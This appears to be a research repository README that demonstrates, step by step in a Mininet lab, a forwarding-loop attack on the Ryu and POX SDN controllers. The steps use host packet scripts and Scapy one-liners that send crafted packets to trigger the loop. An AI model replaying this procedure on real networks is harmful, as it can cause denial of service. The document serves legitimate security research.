# Step-by-step Demonstration

This experiment was performed on an Ubuntu 22.04 Desktop VM. As a prerequisite for the procedures outlined below, the underlying environment was preconfigured with Mininet, Python 3, and the Scapy packet-manipulation library. Additionally, three distinct SDN controllers were compiled and deployed directly from their respective source code repositories.

1. [Ryu](#Ryu)
2. [POX](#POX)
3. 

## Ryu
First, purge and reset the residual virtual network state and cache within the Mininet environment.
```bash
sudo mn -c
```
![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/Ryu/1.png)

Subsequently, initialize and launch the SDN controller service.
```bash
ryu-manager simple_switch_13.py
```
![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/Ryu/2.png)

Next, load and instantiate the predefined Mininet network topology.
```bash
sudo python3 -E LoopGen_topo.py
```
![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/Ryu/3.png)

Invoke the interactive terminal consoles for the respective virtual hosts.
```bash
mininet> xterm h1 h2 h3
```
![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/Ryu/4.png)

Following this, execute customized packet procedures within each host node.
```bash
# Node: h1
python3 LoopGen_packets.py h1-eth0 00:00:00:00:00:02

# Node: h2
python3 LoopGen_packets.py h2-eth0 00:00:00:00:00:03

# Node: h3
python3 LoopGen_packets.py h3-eth0 00:00:00:00:00:01
```
![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/Ryu/5.png)
The terminal output demonstrating successful packet transmission is presented below:
![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/Ryu/7.png)

Finally, trigger the targeted attack by crafting specific network packets, and safely terminate the Mininet session upon completion of the experimental validation.
```bash
mininet> h1 python3 -c "from scapy.all import sendp, Ether, IP, UDP; sendp(Ether(src='00:00:00:00:00:01', dst='00:00:00:00:00:08')/IP(dst='10.0.0.8')/UDP(dport=9999), iface='h1-eth0', count=1)"
```
![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/Ryu/8.png)
```bash
mininet> exit
```
![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/Ryu/9.png)

## POX
### Layer 2
First, purge and reset the residual virtual network state and cache within the Mininet environment.
```bash
sudo mn -c
```
![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/POX/L2/1.png)

Subsequently, initialize and launch the SDN controller service.
```bash
./pox.py log.level --DEBUG openflow.of_01 --port=6633 forwarding.l2_learning
```
![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/POX/L2/2.png)

Next, load and instantiate the predefined Mininet network topology.
```bash
sudo python3 -E LoopGen_topo.py
```
![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/POX/L2/3.png)

Invoke the interactive terminal consoles for the respective virtual hosts. And then execute customized packet procedures on each host node.
```bash
mininet> xterm h1 h2 h3
```
```bash
# Node: h1
python3 LoopGen_packets.py h1-eth0 00:00:00:00:00:02

# Node: h2
python3 LoopGen_packets.py h2-eth0 00:00:00:00:00:03

# Node: h3
python3 LoopGen_packets.py h3-eth0 00:00:00:00:00:01
```
![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/POX/L2/4.png)
The terminal output demonstrating successful packet transmission is presented below:
![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/POX/L2/5.png)

Finally, trigger the targeted attack by crafting specific network packets, and safely terminate the Mininet session upon completion of the experimental validation.
```bash
mininet> h1 python3 -c "from scapy.all import sendp, Ether, IP, UDP; sendp(Ether(src='00:00:00:00:00:01', dst='00:00:00:00:00:08')/IP(dst='10.0.0.8')/UDP(dport=9999), iface='h1-eth0', count=1)"

mininet> exit
```
![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/POX/L2/6.png)

### Layer 3
First, purge and reset the residual virtual network state and cache within the Mininet environment.
```bash
sudo mn -c
```
![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/POX/L3/1.png)

Subsequently, initialize and launch the SDN controller service.
```bash
./pox.py log.level --DEBUG openflow.of_01 --port=6633 forwarding.l3_learning
```
![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/POX/L3/2.png)

Next, load and instantiate the predefined Mininet network topology.
```bash
sudo python3 -E LoopGen_topo_l3.py
```
![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/POX/L3/3.png)

Invoke the interactive terminal consoles for the respective virtual hosts. And then execute customized packet procedures on each host node.
```bash
mininet> xterm h1 h2 h3
```
```bash
# Node: h1
python3 LoopGen_packets_l3.py h1-eth0 10.0.0.2
# Node: h2
python3 LoopGen_packets_l3.py h2-eth0 10.0.0.3
# Node: h3
python3 LoopGen_packets_l3.py h3-eth0 10.0.0.1
```
![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/POX/L3/4.png)
The terminal output demonstrating successful packet transmission is presented below:
![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/POX/L3/5.png)

Finally, trigger the targeted attack by crafting specific network packets, and safely terminate the Mininet session upon completion of the experimental validation.
```bash
mininet> h1 python3 -c "from scapy.all import sendp, Ether, IP, UDP; print('Triggering Loop...'); sendp(Ether(dst='ff:ff:ff:ff:ff:ff')/IP(dst='10.0.0.8')/UDP(dport=9999, sport=1234), iface='h1-eth0', count=7, inter=0.5)"

mininet> exit
```
![image](https://github.com/JiangYingEr/LoopGen/blob/main/Experiment/Feasibility/AcrossController/Images/POX/L3/6.png)
